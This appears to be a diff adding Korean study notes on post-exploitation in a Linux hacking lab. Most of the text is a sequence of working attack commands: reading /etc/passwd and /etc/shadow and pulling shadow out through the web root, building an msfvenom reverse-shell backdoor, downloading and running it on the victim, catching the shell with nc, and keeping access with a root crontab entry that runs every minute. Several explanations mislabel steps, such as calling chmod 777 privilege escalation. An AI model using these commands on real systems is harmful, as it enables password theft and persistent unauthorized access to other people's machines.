@@ -1,0 +1,39 @@
+[Post Exploit] : 서버에 침투 한 후 이루어지는 모든 공격
+셸 획득 후 cd/root로 이동 & ls -al을 입력하면 .bash_history 파일이 있음 = bash에서 사용한 명령어들을 기록해 놓은 파일 / cat을 통해 사용자가 쓴 명령어 파악가능
+cat /etc/passwd : 사용자 계정파일들을 볼 수 있음 (비밀번호 자리에 x 로 되어있음)
+비밀번호 까지 파악하려면 cat /etc/shadow로 볼 수 있음 (But 비밀번호들은 서버에 평문 그대로가 아닌 해쉬값으로 저장되어있음(일방향함수-해쉬값을 다시 평문복구 불가)
+공격자 PC로 이 파일을 가져오려면 netstat -ant로 80포트가 열려있는지 확인한 후
+cp /etc/shadow /var/www/html/  명령으로 파일을 가져온다
+chmod 777 /var/www/html/shadow  명령으로 권한상승 까지 해주면 공격자 웹서버에 탈취한 shadow 파일이 올라와 있음(Reverse Shell 의 일종)
+웹서버에 있는 파일 다운로드 = wget http://192.168.0.104/shadow
+cat shadow로 볼 수 있음
+
+rainbow 공격 : 사용자가 쓸만한 비밀번호를 해쉬값으로 모두 변경해 놓고 대입하는 공격 
+
+[Privilege Escalation : 권한상승]
+root 권한 : 리눅스 시스템 상 가장 높은 권한(못 할 수없는 명령이 없음) => 해킹의 최종 목표는 root권한을 획득하는 것
+보통 공격자들은 악성코드를 피해자 PC에 두고 컴파일을 함(∵ 공격자와 피해자 PC 간 환경이 다르기때문에 공격자 PC에서 컴파일하여 넘길경우 실행이 되지 않을 수 있음)
+동적라이브러리 : 필요한 코드를 필요할 때 마다 다른프로그램들과 같이 공유하여 사용하는 것
+정적라이브러리 : 필요한 코드를 시작부터 미리 다 확보하여 사용하는 것
+
+[백도어] = 뒷 문 (몰래 침투하여 해킹)
+crontab -l : 등록되어 있는 작업들을 볼 수 있음
+service apache2 start 로 공격자 PC에서 웹 서비스를 실행시킨다.
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.103 LPORT=7777 -f elf > backdoor  (백도어 악성코드 작성) => Reverse Shell
+
+cp backdoor /var/www/html -> 경로변경 후
+chmod 777 /var/www/html/backdoor 권한을 상승시킴
+
+wget http://192.168.0.103/backdoor 로 공격자 서버에 올라온 파일을 받을 수 있음
+여기서 chmod 777 backdoor 를 하여 권한상승을 시켜 실행을 시킬수 있음
+
+nc -nlvp 7777 로 포트를 열어주고
+피해자 pc에서 ./backdoor를 실행하면 공격자 PC에서 피해자 PC의 셸을 얻을 수 있게 된다.
+
+1분마다 실행되게 하려면
+(echo "* * * * * /root/backdoor") | crontab -
+
+crontab -l
+
+를 입력한다. 이 후 공격자가 로그인 시 1분 마다 피해자 PC 의 셸을 얻을 수 있게 된다.
